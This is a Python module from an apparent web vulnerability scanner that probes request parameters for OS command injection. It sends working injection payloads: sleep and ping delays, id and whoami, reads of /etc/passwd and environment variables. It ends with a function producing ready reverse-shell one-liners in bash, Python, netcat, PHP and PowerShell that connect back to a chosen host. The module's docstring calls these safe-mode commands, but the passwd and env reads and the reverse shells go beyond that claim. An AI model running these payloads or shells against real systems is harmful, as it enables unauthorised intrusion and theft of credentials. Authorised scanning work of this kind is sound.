"""SentinelX module [11]: OS Command Injection / RCE.

Real implementation: chaining separators, blind time-based with
baseline subtraction (3 baseline + 2 injected samples), blind
output-based with command-output regexes. Safe mode: only
non-destructive commands (sleep, id, whoami, uname).
"""

from __future__ import annotations

import re
import time
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
from sentinelx.core.baseline import get_baseline, adaptive_delay


SEPARATORS = [";", "|", "||", "&&", "`", "$()", "%0a", "%0d", "\n", "${IFS}", "%09"]

TIME_CMDS = [
    # --- TECHNIQUE: sleep chaining ---
    "; sleep {d}", "| sleep {d}", "&& sleep {d}",
    "; /bin/sleep {d}", "`sleep {d}`", "$(sleep {d})",
    # --- TECHNIQUE: ping delay ---
    "; ping -c {d} 127.0.0.1", "| ping -c {d} 127.0.0.1",
    # --- TECHNIQUE: timeout ---
    "; timeout {d}",
    # --- TECHNIQUE: IFS obfuscation ---
    ";sleep${IFS}{d}", "%0asleep${IFS}{d}",
    # --- TECHNIQUE: language runtimes ---
    "; php -r 'sleep({d});'",
    "; python3 -c 'import time;time.sleep({d})'",
    "; node -e 'setTimeout(()=>{}, {d}000)'",
    "; perl -e 'sleep({d})'",
    # --- TECHNIQUE: balanced quotes ---
    "'; sleep {d}; '", '"; sleep {d}; "',
]
OUTPUT_PAYLOADS = [
    # --- TECHNIQUE: id via separators ---
    ("; id", re.compile(r"uid=\d+.*gid=\d+")),
    ("| id", re.compile(r"uid=\d+.*gid=\d+")),
    ("&& id", re.compile(r"uid=\d+.*gid=\d+")),
    ("|| id", re.compile(r"uid=\d+.*gid=\d+")),
    ("`id`", re.compile(r"uid=\d+.*gid=\d+")),
    ("$(id)", re.compile(r"uid=\d+.*gid=\d+")),
    ("%0aid", re.compile(r"uid=\d+.*gid=\d+")),
    # --- TECHNIQUE: whoami ---
    ("; whoami", re.compile(r"(?m)^(root|www-data|apache|nginx|daemon|nobody)\s*$")),
    ("| whoami", re.compile(r"(?m)^(root|www-data|apache|nginx|daemon|nobody)\s*$")),
    # --- TECHNIQUE: uname ---
    ("; uname -a", re.compile(r"Linux .*GNU|Darwin ")),
    ("&& uname -a", re.compile(r"Linux .*GNU|Darwin ")),
    # --- TECHNIQUE: passwd read ---
    ("; cat /etc/passwd", re.compile(r"root:x:0:0:")),
    ("| cat /etc/passwd", re.compile(r"root:x:0:0:")),
    ("; cat${IFS}/etc/passwd", re.compile(r"root:x:0:0:")),
    # --- TECHNIQUE: env ---
    ("; env", re.compile(r"PATH=", re.I)),
    # --- TECHNIQUE: arithmetic proof (language-agnostic) ---
    ("; echo $((1337*2))", re.compile(r"2674")),
    ("| echo $((1337*2))", re.compile(r"2674")),
    ("; expr 1337 * 2", re.compile(r"2674")),
    # --- TECHNIQUE: runtime echo ---
    ("; php -r 'echo 1337*2;'", re.compile(r"2674")),
    ("; python3 -c 'print(1337*2)'", re.compile(r"2674")),
    ("; node -e 'console.log(1337*2)'", re.compile(r"2674")),
    # --- TECHNIQUE: Windows ---
    ("& whoami", re.compile(r"(?m)^[a-z0-9_\\\\-]+$", re.I)),
    ("; ver", re.compile(r"Windows", re.I)),
]

REMEDIATION_RCE = (
    "Never pass user input to shells. Use exec-family calls with argument arrays, "
    "avoid shell=True. Allowlist permitted commands, run with least privilege, "
    "and apply strict input validation."
)


async def _send(client, method, url, params, param, value):
    p = dict(params); p[param] = value
    t0 = time.monotonic()
    if method == "GET":
        full = url + ("&" if "?" in url else "?") + _urlencode(p)
        resp = await client.get(full)
        return resp, full, None, time.monotonic() - t0
    resp = await client.post(url, data=p)
    return resp, url, _urlencode(p).encode(), time.monotonic() - t0


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent}
    cmdish = [p for p in params if re.search(r"cmd|command|exec|run|ping|host|ip|domain|query", p, re.I)]
    targets = cmdish or list(params)[:2]

    for param in targets:
        # shared baseline (fetched once per endpoint, reused by all modules)
        bl = await get_baseline(client, method, url, params)
        if not bl or not bl.stable:
            continue
        base_avg, base_max = bl.avg_time, bl.avg_time
        delay = adaptive_delay(bl.avg_time)
        # refine base_max with 2 extra samples for tight thresholding
        for _ in range(2):
            _, _, _, el = await _send(client, method, url, params, param, params[param])
            base_max = max(base_max, el)
        base_avg = bl.avg_time

        # 1. output-based
        for payload, rx in OUTPUT_PAYLOADS:
            resp, full, body_sent, _ = await _send(
                client, method, url, params, param, params[param] + payload)
            if not resp:
                continue
            m = rx.search(resp.text)
            # confirm with second sample to rule out coincidence
            if m:
                r2, _, _, _ = await _send(
                    client, method, url, params, param, params[param] + payload)
                if r2 and rx.search(r2.text):
                    ev = Evidence(
                        request_raw=raw_request(method, full, headers, body_sent),
                        response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                        proof=f"Command output signature in response (2/2): {m.group(0)[:80]}",
                    )
                    findings.append(Finding(
                        type="OS Command Injection", subtype="output-based",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=0.95, url=full, method=method, param=param,
                        payload=payload, evidence=ev, cwe="CWE-78",
                        owasp="A03:2021 – Injection",
                        remediation=REMEDIATION_RCE,
                        references=["https://owasp.org/www-community/attacks/Command_Injection"],
                    ))
                    break
        if findings:
            continue

        # 2. time-based with statistical timing (5 samples, outlier rejection)
        # Measures baseline jitter, then requires 4/5 injected samples to
        # exceed threshold. Outlier rejection: drop the single highest
        # baseline sample before computing threshold.
        for tmpl in TIME_CMDS:
            payload = tmpl.format(d=int(delay))
            # baseline: 5 samples, drop highest (outlier), take max of rest
            bl_samples = []
            for _ in range(5):
                _, _, _, el = await _send(
                    client, method, url, params, param, params[param])
                bl_samples.append(el)
            bl_samples.sort()
            bl_ref = max(bl_samples[:-1]) if len(bl_samples) > 1 else bl_samples[0]
            # injected: 5 samples
            samples = []
            last_full, last_body, last_resp = "", None, None
            for _ in range(5):
                resp, full, body_sent, el = await _send(
                    client, method, url, params, param, params[param] + payload)
                if resp is None:
                    break
                samples.append(el)
                last_full, last_body, last_resp = full, body_sent, resp
            if len(samples) < 5:
                continue
            threshold = bl_ref + delay * 0.7
            hits = sum(1 for s in samples if s >= threshold)
            # require 4/5 and baseline itself fast
            if hits >= 4 and bl_ref < delay * 0.5:
                ev = Evidence(
                    request_raw=raw_request(method, last_full, headers, last_body),
                    response_raw=raw_response(
                        last_resp.status_code, dict(last_resp.headers),
                        last_resp.content),
                    proof=(f"Statistical timing: {hits}/5 samples delayed "
                           f"(avg {sum(samples)/len(samples):.1f}s) vs "
                           f"baseline max {bl_ref:.2f}s (outlier rejected)"),
                )
                findings.append(Finding(
                    type="OS Command Injection", subtype="time-blind-statistical",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.90, url=last_full, method=method, param=param,
                    payload=payload, evidence=ev, cwe="CWE-78",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_RCE,
                    references=["https://owasp.org/www-community/attacks/Command_Injection"],
                ))
                break
    return findings


def reverse_shells(lhost: str, lport: int) -> dict[str, str]:
    """Reverse shell one-liners (only rendered when --lhost/--lport given)."""
    return {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": (f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
                   f"s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
                   f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                   f"subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "php": f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": (
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$s.Write((([text.encoding]::ASCII).GetBytes($r)),0,$r.Length)}}"
        ),
    }
